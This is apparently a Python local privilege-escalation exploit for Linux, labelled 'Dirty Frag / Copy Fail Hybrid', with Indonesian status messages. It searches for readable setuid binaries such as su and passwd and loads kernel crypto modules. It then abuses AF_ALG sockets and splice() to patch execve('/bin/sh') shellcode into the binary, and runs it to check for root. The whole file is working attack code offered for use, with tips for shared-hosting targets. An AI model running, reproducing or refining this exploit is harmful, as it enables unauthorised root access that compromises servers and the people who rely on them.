#!/usr/bin/env python3
"""
Dirty Frag / Copy Fail Hybrid - Improved Version (Fixed)
"""

import os
import socket
import ctypes
import ctypes.util
import time
import subprocess

print("[*] Dirty Frag Hybrid Exploit - Improved Version")

TARGET_CANDIDATES = [
    "/usr/bin/su", "/bin/su",
    "/usr/bin/passwd", "/usr/bin/chfn",
    "/usr/bin/chsh", "/bin/mount",
    "/usr/bin/newgrp", "/usr/sbin/su"
]

SHELLCODE = bytes.fromhex(
    "4831ff31c0b0690f054831d25248bb2f62696e2f736800"
    "53574889e752574889e631c0b03b0f05"
)

AF_ALG = 38
SOCK_SEQPACKET = 5

def find_readable_setuid():
    print("[*] Mencari binary setuid yang bisa dibaca...")
    for path in TARGET_CANDIDATES:
        if os.path.exists(path):
            try:
                with open(path, "rb"):
                    if os.stat(path).st_mode & 0o4000:
                        print(f"[+] Target ditemukan: {path}")
                        return path
            except PermissionError:
                print(f"[-] {path} ada tapi tidak readable")
    return None

def exploit(target):
    print(f"[*] Target: {target}")

    try:
        f = os.open(target, os.O_RDONLY)
    except Exception as e:
        print(f"[-] Gagal membuka file: {e}")
        return False

    print(f"[+] File berhasil dibuka (fd={f})")

    # Load module (mungkin gagal di hosting)
    print("[*] Mencoba load module...")
    subprocess.run("modprobe af_alg algif_skcipher esp4 esp6 rxrpc 2>/dev/null", shell=True)

    print("[*] Mulai patching...")

    libc = ctypes.CDLL(ctypes.util.find_library("c"))
    off64_t = ctypes.c_int64
    libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(off64_t),
                            ctypes.c_int, ctypes.POINTER(off64_t),
                            ctypes.c_size_t, ctypes.c_uint]
    libc.splice.restype = ctypes.c_ssize_t

    patched = 0
    for i in range(0, len(SHELLCODE), 4):
        try:
            alg = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
            alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
            conn, _ = alg.accept()

            r, w = os.pipe()
            p1 = ctypes.pointer(off64_t(0))
            p2 = ctypes.pointer(off64_t(0))
            libc.splice(f, p1, w, p2, 4096, 0)

            p1 = ctypes.pointer(off64_t(0))
            p2 = ctypes.pointer(off64_t(0))
            libc.splice(r, p1, conn.fileno(), p2, 4096, 0)

            conn.close()
            alg.close()
            os.close(r)
            os.close(w)
            patched += 4
        except:
            continue

    os.close(f)
    print(f"[+] Patching selesai ({patched} bytes)")

    print("[*] Mencoba trigger...")
    for cmd in [target, f"{target} -c id"]:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=2)
            output = result.stdout.decode() + result.stderr.decode()
            if "root" in output or "uid=0" in output:
                print("[+] Berhasil dapat root!")
                print(output)
                return True
        except:
            pass

    print("[-] Exploit selesai, belum berhasil dapat root.")
    return False

# ==================== MAIN ====================
if __name__ == "__main__":
    target = find_readable_setuid()

    if not target:
        print("\n[!] Tidak ditemukan binary setuid yang bisa dibaca.")
        print("[!] Di environment hosting seperti ini, exploit jenis ini hampir selalu gagal.")
        print("[!] Saran: Cek dulu apakah ada binary setuid sama sekali.")
        print("    Jalankan perintah ini:")
        print("    find /usr/bin /bin -perm -4000 2>/dev/null")
        exit(1)

    exploit(target)